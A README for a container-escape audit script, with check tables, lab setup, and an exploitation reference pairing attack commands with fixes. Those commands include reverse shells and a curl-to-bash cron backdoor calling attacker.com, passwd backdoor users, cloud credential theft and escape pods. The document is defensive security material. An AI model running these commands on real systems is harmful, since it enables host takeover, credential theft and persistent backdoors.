# 🔍 K8s_container-escape-audit

A bash script for detecting container escape vectors from within a running Docker or Kubernetes container. Designed for authorised penetration testing, red team assessments, and security hardening reviews.

> ⚠️ **For authorised security assessments only.** Do not run this script on systems you do not have explicit written permission to test.

## Overview

`container_escape_audit.sh` runs inside a container and performs **35 checks** across the primary categories of container escape: privileged configuration, dangerous Linux capabilities, namespace isolation, filesystem mounts, kernel exposure, Kubernetes misconfigurations, cloud metadata access, and recent CVEs including Copy Fail (CVE-2026-31431), NVIDIAScape (CVE-2025-23266), and the November 2025 runc trilogy.

Each finding produces a structured report entry covering:

- **What it is**: the misconfiguration or exposure
- **Impact**: worst-case outcome if exploited
- **Exploitability**: difficulty, required tooling, real-world precedent
- **Recommendation**: specific remediation steps

> **Note on running as root:** Several checks (privileged container, dangerous capabilities, UID 0 mapping) will always produce findings when the audit script is run as root inside the container. This is expected and correct — the findings reflect the real security posture of the container, not a false positive. Running as root without user namespace remapping is itself a meaningful finding.

---

## Checks

### Container configuration

| # | Check | Severity |
|---|---|---|
| 1 | Privileged container (`--privileged`) | CRITICAL |
| 2 | Dangerous Linux capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, etc.) | HIGH |
| 3 | Host namespace sharing (PID, network, IPC, UTS, mount) | HIGH |
| 11 | Seccomp / AppArmor / SELinux disabled or unconfined | MEDIUM |
| 27 | User namespace UID mapping (root-in-container = root-on-host) | HIGH |

### Filesystem and mounts

| # | Check | Severity |
|---|---|---|
| 4 | Dangerous host filesystem mounts (`/`, `/etc`, `/dev`, `/sys`, runtime sockets) | CRITICAL |
| 5 | `/proc` filesystem exposure (core_pattern, sysrq-trigger, kcore, kmem, PID1 environ) | CRITICAL |
| 8 | Writable cron directories | HIGH |
| 9 | Writable authentication files (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`) | CRITICAL |
| 13 | SUID/SGID binaries | MEDIUM |
| 17 | Writable dynamic linker config (`/etc/ld.so.preload`, `ld.so.conf.d`) | HIGH |
| 23 | OverlayFS upper directory writability / layer inspection | MEDIUM |
| 33 | OCI hook injection paths (`/run/oci/hooks.d`) | CRITICAL/MEDIUM |

### Kernel

| # | Check | Severity |
|---|---|---|
| 10 | `/dev/mem` access and ptrace scope | CRITICAL |
| 12 | cgroup v1 `release_agent` escape path | CRITICAL |
| 14 | Kernel version and CVE checks (DirtyPipe CVE-2022-0847, DirtyCOW CVE-2016-5195) | HIGH |
| 19 | cgroup v2 writability | MEDIUM |
| 22 | Kernel module loading status (`modules_disabled`) | INFO |
| 28 | eBPF exposure (CAP_BPF + bpf syscall availability) | CRITICAL |
| 29 | debugfs / tracefs mounted and accessible | HIGH |
| 32 | Kernel keyring exposure | HIGH |
| 34 | Page cache write primitives (splice + pipe2 syscall availability) | HIGH |
| 35 | Procfs namespace file descriptor leakage | MEDIUM |

### Kubernetes and cloud

| # | Check | Severity |
|---|---|---|
| 6 | Kubernetes service account token and RBAC permissions | HIGH–CRITICAL |
| 7 | Environment variable secret leakage | MEDIUM |
| 15 | Cloud instance metadata service reachable (AWS, Azure, GCP) | CRITICAL |
| 16 | Kubelet API exposed unauthenticated (ports 10250, 10255) | CRITICAL |
| 20 | Secret mount directories (`/run/secrets`, `/var/run/secrets`) | HIGH |
| 30 | Kubernetes RBAC active escalation path probing | HIGH–CRITICAL |

### Host access

| # | Check | Severity |
|---|---|---|
| 18 | Namespace escape tooling present (`nsenter`, `unshare`, `runc`, `crictl`) | MEDIUM |
| 21 | SSH private keys readable | HIGH |
| 31 | Additional container runtime sockets (Podman, BuildKit, Kata) | CRITICAL |

### Recent CVEs (USP)

| # | Check | Severity |
|---|---|---|
| 24 | Copy Fail (CVE-2026-31431) — AF_ALG algif_aead page cache write | CRITICAL |
| 25 | NVIDIAScape (CVE-2025-23266) — NVIDIA Container Toolkit OCI hook LD_PRELOAD | CRITICAL |
| 26 | runc masked path race (CVE-2025-31133 / CVE-2025-52565 / CVE-2025-52881) | CRITICAL |

---

## Usage

```bash
# Download and run
curl -O https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/main/container_escape_audit.sh
chmod +x container_escape_audit.sh
./container_escape_audit.sh
```

### Options

```
--report <file>    Write detailed report to <file>
                   Default: container_escape_report_<timestamp>.txt
--json             Emit JSON summary to stdout (for SIEM/log ingestion)
--quiet            Suppress info lines; print only WARN/CRITICAL to terminal
--no-report        Skip writing the report file entirely
```

### Examples

```bash
# Standard run — report written to timestamped file
./container_escape_audit.sh

# Custom report path
./container_escape_audit.sh --report /tmp/audit_$(hostname).txt

# JSON output — filter CRITICAL findings
./container_escape_audit.sh --json --no-report | jq '.findings[] | select(.severity=="CRITICAL")'

# Pipe JSON into a file and suppress terminal noise
./container_escape_audit.sh --json --quiet --no-report > findings.json

# Quiet terminal output with report
./container_escape_audit.sh --quiet --report ./report.txt
```

### Running inside a Kubernetes pod

```bash
# Copy into a running pod
kubectl cp container_escape_audit.sh <namespace>/<pod>:/tmp/audit.sh

# Execute
kubectl exec -n <namespace> <pod> -- bash /tmp/audit.sh --report /tmp/report.txt

# Retrieve the report
kubectl cp <namespace>/<pod>:/tmp/report.txt ./audit_report.txt
```

### Running as a Kubernetes Job

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: container-escape-audit
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
        - name: audit
          image: alpine:latest
          command:
            - sh
            - -c
            - |
              apk add --no-cache bash curl && \
              curl -sO https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/main/container_escape_audit.sh && \
              chmod +x container_escape_audit.sh && \
              ./container_escape_audit.sh --json
```

```bash
kubectl apply -f audit-job.yaml
kubectl wait --for=condition=complete job/container-escape-audit --timeout=120s
kubectl logs job/container-escape-audit
kubectl delete job container-escape-audit
```

---

## Lab Setup for Testing

The following sets up a deliberately misconfigured Docker container that exercises the majority of the 35 checks. **Use an isolated VM only — never on a production host or any machine with sensitive data.**

### Prerequisites

```bash
# Add yourself to the docker group to avoid needing sudo on every command
sudo usermod -aG docker $USER
newgrp docker

# Or prefix every docker command with sudo
```

### Step 1 — Start the vulnerable container

```bash
sudo docker run -d \
  --name cea_vulnerable \
  --hostname cea-target \
  --privileged \
  --pid=host \
  --ipc=host \
  --dns=8.8.8.8 \
  --dns=8.8.4.4 \
  --security-opt apparmor=unconfined \
  --security-opt seccomp=unconfined \
  --cap-add SYS_ADMIN \
  --cap-add SYS_PTRACE \
  --cap-add BPF \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /sys:/sys:rw \
  -v $(pwd):/audit:ro \
  -e DATABASE_PASSWORD=supersecret \
  -e AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLEfakekey \
  -e GITHUB_TOKEN=ghp_fakeTokenForTesting \
  -e API_KEY=fake-api-key-12345 \
  ubuntu:22.04 \
  tail -f /dev/null
```

The `--dns` flags are required because `--pid=host` combined with `--privileged` can interfere with the container's DNS resolution on some systems.

### Step 2 — Exec in and verify internet access

```bash
sudo docker exec -it cea_vulnerable bash
```

Once inside, verify DNS is working before proceeding:

```bash
ping -c1 archive.ubuntu.com
# If DNS fails: echo "nameserver 8.8.8.8" > /etc/resolv.conf
```

### Step 3 — Install packages

```bash
apt-get update -qq && apt-get install -y \
  curl python3 sudo procps \
  libcap2-bin cron vim util-linux
```

### Step 4 — Configure misconfigurations

```bash
# Create a test user (check 9)
useradd -m -s /bin/bash testuser
echo 'testuser:password' | chpasswd

# Writable sudoers — inside container only (check 9)
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

# Writable cron — inside container only (check 8)
echo '* * * * * root echo vuln > /tmp/cron_test' > /etc/cron.d/testlab
service cron start

# SUID binaries (check 13)
chmod u+s /usr/bin/find
chmod u+s /usr/bin/python3
```

### Step 5 — Run the audit

```bash
bash /audit/container_escape_audit.sh
```

To save the report and copy it to your host:

```bash
# Inside the container
bash /audit/container_escape_audit.sh --report /tmp/audit_report.txt

# From a second terminal on the host
sudo docker cp cea_vulnerable:/tmp/audit_report.txt ./audit_report.txt
```

### Step 6 — Tear down when done

```bash
sudo docker rm -f cea_vulnerable
```

### Expected findings in the lab container

| Check | Expected result | Notes |
|---|---|---|
| 1 — Privileged | CRITICAL | `--privileged` flag |
| 2 — Capabilities | HIGH × 4+ | SYS_ADMIN, SYS_PTRACE, BPF, etc. |
| 3 — Namespaces | HIGH × 2 | `--pid=host`, `--ipc=host` |
| 4 — Mounts | CRITICAL | docker.sock, /sys |
| 5 — /proc | CRITICAL | core_pattern writable via privileged |
| 7 — Env secrets | MEDIUM × 4 | DATABASE_PASSWORD, AWS key, etc. |
| 8 — Cron | HIGH | /etc/cron.d/testlab writable |
| 9 — Auth files | CRITICAL | /etc/sudoers modified |
| 11 — Seccomp | MEDIUM × 2 | Both unconfined |
| 12 — cgroup | CRITICAL | release_agent writable |
| 13 — SUID | MEDIUM | find, python3 |
| 24 — Copy Fail | CRITICAL/INFO | Depends on host kernel patch status |
| 27 — UID mapping | HIGH | Running as root, no userns remap |
| 28 — eBPF | CRITICAL | CAP_BPF + seccomp unconfined |
| 29 — debugfs | MEDIUM | /sys mounted |
| 31 — Runtime socket | CRITICAL | docker.sock mounted |
| 34 — splice/pipe2 | HIGH | seccomp unconfined |
| 35 — /proc PIDs | MEDIUM | --pid=host |

**Checks that won't fire in this lab** (require real infrastructure): Check 15 (cloud IMDS), Check 16 (Kubelet API), Check 25 (real NVIDIA CTK), Check 26 (depends on runc version), Check 30 (requires live Kubernetes API).

---

## Output

### Terminal output

```
========================================================
  container_escape_audit.sh v3.0
  Container escape vector detection
  FOR AUTHORISED SECURITY ASSESSMENTS ONLY
========================================================

--- 1. Privileged container ---
[CRIT]  Container appears PRIVILEGED (CapEff=000001ffffffffff)

--- 4. Dangerous filesystem mounts ---
[CRIT]  Container runtime socket accessible: /var/run/docker.sock

--- 24. Copy Fail (CVE-2026-31431) ---
[CRIT]  VULNERABLE to Copy Fail — AEAD socket bindable, kernel 6.5.0-21-generic

==================== SUMMARY ====================
  [CRITICAL] Container is running in privileged mode
  [CRITICAL] Container runtime socket accessible: /var/run/docker.sock
  [CRITICAL] Copy Fail (CVE-2026-31431) AF_ALG exposure — CRITICAL
  [HIGH    ] Kubernetes service account token is readable
  [MEDIUM  ] Seccomp is disabled for this container

  CRITICAL: 3  |  HIGH: 4  |  MEDIUM: 5  |  INFO: 2
```

### JSON output

```json
{
  "tool": "container_escape_audit",
  "version": "3.0",
  "timestamp": "2026-05-01T10:32:00Z",
  "host": "cea-target",
  "kernel": "6.5.0-21-generic",
  "findings": [
    {
      "id": "cve_2026_31431_copy_fail",
      "severity": "CRITICAL",
      "title": "Copy Fail (CVE-2026-31431) AF_ALG exposure — CRITICAL",
      "what": "AF_ALG socket family is accessible and the authencesn AEAD algorithm can be bound...",
      "impact": "Allows controlled 4-byte writes into the page cache of any readable executable...",
      "exploitability": "Trivial. A single Python script achieves root reliably...",
      "recommendation": "Apply kernel patches from your distribution immediately..."
    }
  ]
}
```

---

## Requirements

| Tool | Required | Used for |
|---|---|---|
| `bash` | Yes | Script execution |
| `grep`, `awk`, `find`, `cat` | Yes | Core checks |
| `python3` | Optional | Copy Fail (check 24), eBPF (check 28), splice (check 34) |
| `curl` | Optional | IMDS and kubelet API checks |
| `kubectl` | Optional | Kubernetes RBAC enumeration |
| `capsh` | Optional | Human-readable capability decoding |
| `ip` | Optional | Node IP detection for kubelet checks |
| `keyctl` | Optional | Kernel keyring enumeration (check 32) |
| `sestatus` | Optional | SELinux status |

---

## Severity levels

| Level | Meaning |
|---|---|
| **CRITICAL** | Immediate host escape likely with minimal effort |
| **HIGH** | Significant risk; exploitable with moderate effort or in combination with other findings |
| **MEDIUM** | Defence-in-depth gap; increases exploitability of other findings |
| **INFO** | Informational; recorded for context and cross-referencing |

A single CRITICAL finding is generally sufficient for a complete host compromise. Multiple findings in combination can elevate lower-severity issues — for example, a MEDIUM seccomp finding combined with a HIGH capability finding may together constitute a practical escape path.

---

## Escape techniques covered

**Original checks (1–23):**
- Docker socket escape — create privileged containers via the daemon API
- Privileged container mount — mount raw host block devices
- cgroup v1 release_agent — kernel executes payload on the host when a cgroup empties
- core_pattern pipe handler — kernel executes payload as root on any process crash
- Shocker / CAP_DAC_READ_SEARCH — read host files by inode via `open_by_handle_at(2)`
- CAP_SYS_ADMIN + unshare/nsenter — re-enter host namespaces
- Kernel module loading — load malicious `.ko` for unrestricted kernel code execution
- DirtyPipe (CVE-2022-0847) — overwrite read-only files on host mounts without privileges
- DirtyCOW (CVE-2016-5195) — race condition write to read-only memory mappings
- Kubernetes service account abuse — API server access with over-privileged RBAC
- Kubelet unauthenticated exec — remote code execution in any pod on the node
- Cloud IMDS credential theft — steal IAM credentials for cloud control plane access
- Host namespace escape — `nsenter` into host PID/net/mount namespaces
- ld.so.preload injection — load malicious library into SUID binary execution
- /dev/mem access — read/write physical host memory

**New checks (24–35):**
- Copy Fail (CVE-2026-31431) — AF_ALG + splice page cache write primitive for privilege escalation
- NVIDIAScape (CVE-2025-23266) — NVIDIA Container Toolkit OCI hook LD_PRELOAD injection
- runc masked path race (CVE-2025-31133/-52565/-52881) — /dev/null symlink swap during mount
- User namespace UID 0 mapping — root-in-container equals root-on-host without userns-remap
- eBPF exposure — CAP_BPF + bpf(2) syscall enables kernel memory inspection and interception
- debugfs/tracefs — ftrace interface exposes all kernel function call arguments across the host
- Kubernetes RBAC active probing — live API checks for pod creation, secret listing, role binding
- Additional runtime sockets — Podman, BuildKit, Kata Containers socket exposure
- Kernel keyring — LUKS/dm-crypt and Kerberos key extraction via CAP_SYS_ADMIN
- OCI hook injection — writable `/run/oci/hooks.d` allows code execution during container start
- Page cache write primitives — splice(2) + pipe2(2) availability confirms Copy Fail attack surface
- Procfs namespace leakage — foreign PID visibility and setns fd attack surface

---

## 🔓 Container Escape & Exploitation Reference

> **Purpose:** Documents what an attacker could do if each check returns a finding.
>
> ⚠️ For authorised security testing and defensive purposes only.

<details>
<summary><h3>Container Configuration</h3></summary>

#### Check 1 — Privileged Container (`--privileged`) `CRITICAL`

```bash
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host bash

# Or write a reverse shell into the host crontab
echo '* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1' \
  >> /tmp/host/etc/crontab
```

**Remediation:** Remove `--privileged`. Use `securityContext.capabilities` to grant only the specific capabilities the workload requires.

#### Check 2 — Dangerous Linux Capabilities `HIGH`

| Capability | Exploit Path |
|---|---|
| `CAP_SYS_ADMIN` | Mount filesystems, load kernel modules, use ptrace on any process |
| `CAP_SYS_PTRACE` | Attach to any host process via ptrace, inject shellcode |
| `CAP_SYS_MODULE` | Load a malicious kernel module (`insmod rootkit.ko`) |
| `CAP_NET_ADMIN` | Reroute traffic, ARP spoofing, modify host iptables rules |
| `CAP_DAC_READ_SEARCH` | Shocker exploit — read any host file by inode |
| `CAP_BPF` | Load eBPF programs to inspect all kernel memory and function calls |

```bash
# With CAP_SYS_PTRACE — enter all host namespaces via PID 1
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

**Remediation:**

```yaml
securityContext:
  capabilities:
    drop: ["ALL"]
    add: ["NET_BIND_SERVICE"]
```

#### Check 3 — Host Namespace Sharing `HIGH`

```bash
# hostPID: true — enter host via PID 1
nsenter -t 1 -m -u -i -n -p -- bash

# hostNetwork: true — sniff all node traffic
tcpdump -i eth0

# hostIPC: true — read host shared memory
ipcs -a
```

**Remediation:**

```yaml
spec:
  hostPID: false
  hostNetwork: false
  hostIPC: false
```

#### Check 11 — Seccomp / AppArmor / SELinux Disabled `MEDIUM`

```bash
unshare -UrmC --fork bash
```

**Remediation:**

```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault
```

#### Check 27 — User Namespace UID Mapping `HIGH`

Without user namespace remapping, UID 0 inside the container is UID 0 on the host. Any mount escape, socket access, or capability exploit yields host root directly with no UID boundary to cross.

**Remediation:** Enable userns-remap in Docker (`userns-remap: default` in `/etc/docker/daemon.json`). In Kubernetes, use rootless containers or configure user namespace support (stable in 1.30+). Set `runAsNonRoot: true` in pod security context.

</details>

<details>
<summary><h3>Filesystem and Mounts</h3></summary>

#### Check 4 — Dangerous Host Filesystem Mounts `CRITICAL`

```bash
# Docker socket — instant host root
docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine \
  chroot /host bash

# /etc mounted writable — add root user
echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd
su backdoor

# / mounted — chroot to host
chroot /host-mount bash
```

**Remediation:** Never mount the Docker or containerd socket into containers. Use `readOnly: true` for all required mounts.

#### Check 5 — `/proc` Filesystem Exposure `CRITICAL`

```bash
# Execute arbitrary code as root via core_pattern
echo '|/tmp/payload' > /proc/sys/kernel/core_pattern
kill -SIGSEGV $$   # trigger crash, kernel executes /tmp/payload on host

# Read host process environment
cat /proc/1/environ | tr '\0' '\n'

# Crash or reboot host
echo b > /proc/sysrq-trigger
```

**Remediation:** Mount `/proc/sys` read-only. Deny writes via seccomp.

#### Check 8 — Writable Cron Directories `HIGH`

```bash
echo '* * * * * root curl http://attacker.com/shell.sh | bash' \
  > /etc/cron.d/backdoor
```

**Remediation:**

```yaml
securityContext:
  readOnlyRootFilesystem: true
```

#### Check 9 — Writable Authentication Files `CRITICAL`

```bash
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned

echo 'ALL ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers
```

**Remediation:** Use `readOnlyRootFilesystem: true`. Never bind-mount `/etc` from the host.

#### Check 13 — SUID/SGID Binaries `MEDIUM`

```bash
find / -perm -4000 -type f 2>/dev/null

# If /usr/bin/find has SUID bit
find . -exec /bin/bash -p \; -quit
```

**Remediation:**

```dockerfile
RUN find / -xdev -perm /6000 -type f -exec chmod a-s {} \;
```

#### Check 17 — Writable Dynamic Linker Config `HIGH`

```bash
echo '/tmp/evil_lib' > /etc/ld.so.preload
# All subsequent SUID binary executions load the malicious library first
```

**Remediation:** Use `readOnlyRootFilesystem: true`.

#### Check 23 — OverlayFS Upper Directory `MEDIUM`

Access to the OverlayFS upper layer allows modifying files that appear read-only, or inspecting layers of co-located containers including data "deleted" in later layers.

**Remediation:** Restrict access to `/var/lib/docker` and `/var/lib/containerd` on the host.

#### Check 33 — OCI Hook Injection `CRITICAL`

```bash
# Write a hook that runs on the host during the next container creation
cat > /run/oci/hooks.d/backdoor.json << 'EOF'
{
  "version": "1.0.0",
  "hook": {"path": "/tmp/evil.sh"},
  "when": {"always": true},
  "stages": ["prestart"]
}
EOF
# Executes /tmp/evil.sh on the host at next container start
```

**Remediation:** Never mount OCI hooks directories into containers. Related to NVIDIAScape (CVE-2025-23266) — both exploit the OCI hook trust boundary.

</details>

<details>
<summary><h3>Kernel</h3></summary>

#### Check 10 — `/dev/mem` and ptrace Scope `CRITICAL`

```bash
dd if=/dev/mem bs=1 skip=$((0x100000)) count=1024 | strings

# ptrace_scope=0: attach to privileged host process
gdb -p $(pgrep -n root)
```

**Remediation:** Ensure `/dev/mem` is not accessible. Set `kernel.yama.ptrace_scope=1` on all nodes.

#### Check 12 — cgroup v1 `release_agent` `CRITICAL`

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Remediation:** Migrate to cgroup v2. Block `mount` syscalls via seccomp.

#### Check 14 — Kernel CVEs `HIGH`

| CVE | Kernels Affected | Impact |
|---|---|---|
| **DirtyPipe** CVE-2022-0847 | 5.8 – 5.16.11 | Overwrite read-only files via pipe splice |
| **DirtyCOW** CVE-2016-5195 | < 4.8.3 | Race condition write to read-only memory-mapped files |

**Remediation:** Patch the host kernel. Verify with `uname -r`.

#### Check 19 — cgroup v2 Writability `MEDIUM`

Writable cgroup v2 interfaces enable resource exhaustion attacks against co-located containers. In certain configurations, eBPF hooks via cgroup may also be abused.

**Remediation:** Mount cgroup2 read-only. Restrict `CAP_SYS_ADMIN`.

#### Check 22 — Kernel Module Loading `INFO`

```bash
# If CAP_SYS_MODULE is also present
insmod /tmp/rootkit.ko
```

**Remediation:** Set `kernel.modules_disabled=1` after boot. Deny `CAP_SYS_MODULE` in Pod Security Admission policies.

#### Check 28 — eBPF Exposure `CRITICAL`

```bash
# With CAP_BPF — attach kprobe to any kernel function across the host
# Intercepts arguments including memory contents, file descriptors, tokens
bpftrace -e 'kprobe:vfs_read { printf("%s\n", str(arg1)); }'

# Load a BPF program that exfiltrates data from all processes on the node
```

**Remediation:** Remove `CAP_BPF` and `CAP_SYS_ADMIN`. Apply seccomp to block `bpf(2)` syscall (321 on x86_64). Set `kernel.unprivileged_bpf_disabled=1`.

#### Check 29 — debugfs / tracefs `HIGH`

```bash
# ftrace — trace any kernel function across the entire host
echo function > /sys/kernel/debug/tracing/current_tracer
echo 1 > /sys/kernel/debug/tracing/tracing_on
cat /sys/kernel/debug/tracing/trace
# Captures function arguments from all processes on the node
```

**Remediation:** Do not mount `/sys/kernel/debug` in containers. Remount read-only on the host after boot.

#### Check 32 — Kernel Keyring `HIGH`

```bash
# List session keys (LUKS, Kerberos TGTs, fscrypt keys)
keyctl show @s

# With CAP_SYS_ADMIN — read key contents
keyctl print <key-id>
# May expose disk encryption keys, authentication tokens
```

**Remediation:** Remove `CAP_SYS_ADMIN`. Apply seccomp to block `keyctl(2)` (250 on x86_64).

#### Check 34 — Page Cache Write Primitives `HIGH`

splice(2) and pipe2(2) are the syscalls underlying Copy Fail (CVE-2026-31431) and DirtyPipe (CVE-2022-0847). Their availability confirms the attack surface is not reduced by seccomp filtering.

**Remediation:** Apply a seccomp profile restricting splice(2) and pipe2(2) if not required. Ensure the kernel is fully patched.

#### Check 35 — Procfs Namespace Leakage `MEDIUM`

```bash
# With host PID namespace — enter host mount namespace via PID 1
nsenter -t 1 -m -- ls /
cat /proc/1/environ | tr '\0' '\n'   # host init secrets
cat /proc/<host-pid>/fd/*            # host process file descriptor contents
```

**Remediation:** Mount `/proc` with `hidepid=2`. Set `hostPID: false`.

</details>

<details>
<summary><h3>Recent CVEs</h3></summary>

#### Check 24 — Copy Fail (CVE-2026-31431) `CRITICAL`

Disclosed April 29 2026. A logic bug in the Linux kernel's `algif_aead` cryptographic module allows an unprivileged user to perform controlled 4-byte writes into the page cache of any readable executable via `AF_ALG` + `splice()`. By corrupting the in-memory copy of a setuid binary, an attacker escalates to root. Affects every Linux distribution shipping a kernel built since 2017.

```python
# A ~732-byte Python PoC achieves root on Ubuntu 24.04, Amazon Linux 2023,
# RHEL 10.1, and SUSE 16. No capabilities required.
# Public PoC available. On CISA KEV list with active in-the-wild exploitation.
```

The script actively probes whether:
1. An `AF_ALG` socket can be created
2. The `authencesn(hmac(sha512),cbc(aes))` AEAD algorithm can be bound
3. `splice(2)` and `pipe2(2)` are not seccomp-blocked

**Remediation:**
- Apply kernel patches from your distribution (released from late April 2026)
- Interim: `rmmod algif_aead && echo install algif_aead /bin/false >> /etc/modprobe.d/disable-algif_aead.conf`
- Block `AF_ALG` socket creation via seccomp if not required

#### Check 25 — NVIDIAScape (CVE-2025-23266) `CRITICAL`

Disclosed July 2025. The NVIDIA Container Toolkit's `createContainer` OCI hook inherits environment variables from the container image without sanitisation. Setting `LD_PRELOAD` in a Dockerfile causes the hook to load a malicious shared library into a privileged host process before namespace isolation completes — a three-line Dockerfile achieves full host root. Affects all NCT versions <= 1.17.7. Particularly acute in shared GPU multi-tenant cloud environments.

```dockerfile
FROM nvidia/cuda:12.4.1-base
ENV LD_PRELOAD=/tmp/evil.so
COPY evil.so /tmp/
```

**Remediation:**
- Upgrade NVIDIA Container Toolkit to >= 1.17.8 and GPU Operator to >= 25.3.1
- Interim: set `disable-cuda-compat-lib-hook = true` in `/etc/nvidia-container-toolkit/config.toml`
- Scan running pods for images with `LD_PRELOAD` pointing to writable paths

#### Check 26 — runc Masked Path Race (CVE-2025-31133 / -52565 / -52881) `CRITICAL`

Disclosed November 2025. Three related race conditions in runc's mount handling allow a low-privileged attacker who can spawn containers to write to arbitrary `/proc` files including `/proc/sys/kernel/core_pattern` (arbitrary host code execution) and `/proc/sysrq-trigger` (immediate host reboot). CVE-2025-52881 additionally bypasses AppArmor and SELinux mitigations. Affects all runc versions prior to 1.2.8 / 1.3.3 / 1.4.0-rc.3.

**Remediation:**
- Update runc to >= 1.2.8, >= 1.3.3, or >= 1.4.0-rc.3
- Enable user namespaces for containers (host root not mapped)
- Note: AppArmor and SELinux provide limited protection due to CVE-2025-52881's LSM bypass

</details>

<details>
<summary><h3>Kubernetes and Cloud</h3></summary>

#### Check 6 — Service Account Token & RBAC `HIGH–CRITICAL`

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

curl -s -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews

# If the token has secrets access
curl -s -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets

# If the token can create pods — launch a privileged escape pod
curl -s -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  $APISERVER/api/v1/namespaces/default/pods -d @evil-privileged-pod.json
```

**Remediation:**

```yaml
spec:
  automountServiceAccountToken: false
```

#### Check 7 — Environment Variable Secret Leakage `MEDIUM`

```bash
printenv
cat /proc/1/environ | tr '\0' '\n'
```

**Remediation:** Mount secrets as files. Use an external secrets manager. Rotate any exposed credentials immediately.

#### Check 15 — Cloud IMDS `CRITICAL`

```bash
# AWS — retrieve IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# GCP — retrieve OAuth token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure — retrieve managed identity token
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Remediation:** Enforce IMDSv2 on AWS. Use Workload Identity on GCP/Azure. Block `169.254.169.254` via NetworkPolicy.

#### Check 16 — Kubelet API Unauthenticated `CRITICAL`

```bash
curl -sk https://<node-ip>:10250/pods
curl -sk https://<node-ip>:10250/run/<namespace>/<pod>/<container> \
  -d "cmd=cat /etc/shadow"
curl http://<node-ip>:10255/pods
```

**Remediation:** Set `--anonymous-auth=false` and `--authorization-mode=Webhook` on the kubelet.

#### Check 20 — Secret Mount Directories `HIGH`

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
ls /run/secrets/
```

**Remediation:** Use projected service account tokens with short expiry:

```yaml
volumes:
  - name: token
    projected:
      sources:
        - serviceAccountToken:
            expirationSeconds: 3600
            path: token
```

#### Check 30 — Kubernetes RBAC Active Probing `HIGH–CRITICAL`

The script actively POSTs `SelfSubjectAccessReview` requests to check six specific high-value permissions: creating pods in kube-system, listing secrets cluster-wide, executing into pods, binding ClusterRoles, and creating DaemonSets.

```bash
# If create pods in kube-system is allowed
kubectl run escape --image=ubuntu --privileged --overrides='
{"spec":{"hostPID":true,"hostNetwork":true,
 "volumes":[{"name":"h","hostPath":{"path":"/"}}],
 "containers":[{"name":"c","image":"ubuntu",
   "volumeMounts":[{"name":"h","mountPath":"/host"}]}]}}'
```

**Remediation:** Conduct a full RBAC audit. Use namespace-scoped Roles rather than ClusterRoles.

</details>

<details>
<summary><h3>Host Access</h3></summary>

#### Check 18 — Namespace Escape Tooling `MEDIUM`

```bash
nsenter -t 1 -m -u -i -n -p -- bash
crictl ps && crictl exec -it <container-id> bash
```

**Remediation:** Use minimal/distroless base images. Enforce image scanning in CI.

#### Check 21 — SSH Private Keys Readable `HIGH`

```bash
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null
ssh -i /found/key user@internal-host
```

**Remediation:** Never bake SSH keys into images. Use short-lived certificates (Vault SSH, EC2 Instance Connect).

#### Check 31 — Additional Runtime Sockets `CRITICAL`

```bash
# Podman socket — create containers with arbitrary config
podman -r --url unix:///run/podman/podman.sock run --privileged ...

# BuildKit — inject malicious build steps or exfiltrate build secrets
buildctl --addr unix:///run/buildkit/buildkitd.sock build ...
```

**Remediation:** Audit all volume mounts for runtime socket paths. Never expose runtime sockets to application workloads.

</details>

---

## Integration

### Falco (runtime detection complement)

This script performs point-in-time assessment. For continuous runtime detection, pair with [Falco](https://falco.org/) rules covering:

- Writes to `release_agent` or `core_pattern`
- Spawning of `nsenter`, `unshare`, or `runc` inside containers
- Access to `/var/run/docker.sock`
- Unexpected outbound connections to `169.254.169.254`
- `AF_ALG` socket creation from non-root processes (Copy Fail indicator)
- `LD_PRELOAD` set to paths in `/tmp` or `/dev/shm` (NVIDIAScape indicator)
- Symlink creation over `/dev/null` or `/dev/pts/*` (runc CVE-2025-31133 indicator)

### CI/CD integration

```bash
CRITICAL_COUNT=$(./container_escape_audit.sh --json --no-report \
  | jq '[.findings[] | select(.severity=="CRITICAL")] | length')
if [ "$CRITICAL_COUNT" -gt 0 ]; then
  echo "FAILED: $CRITICAL_COUNT critical escape vectors detected"
  exit 1
fi
```

### SIEM / log ingestion

```bash
./container_escape_audit.sh --json --no-report | \
  jq -c '.findings[]' | \
  while read -r finding; do
    curl -s -X POST https://your-siem/api/events \
      -H 'Content-Type: application/json' \
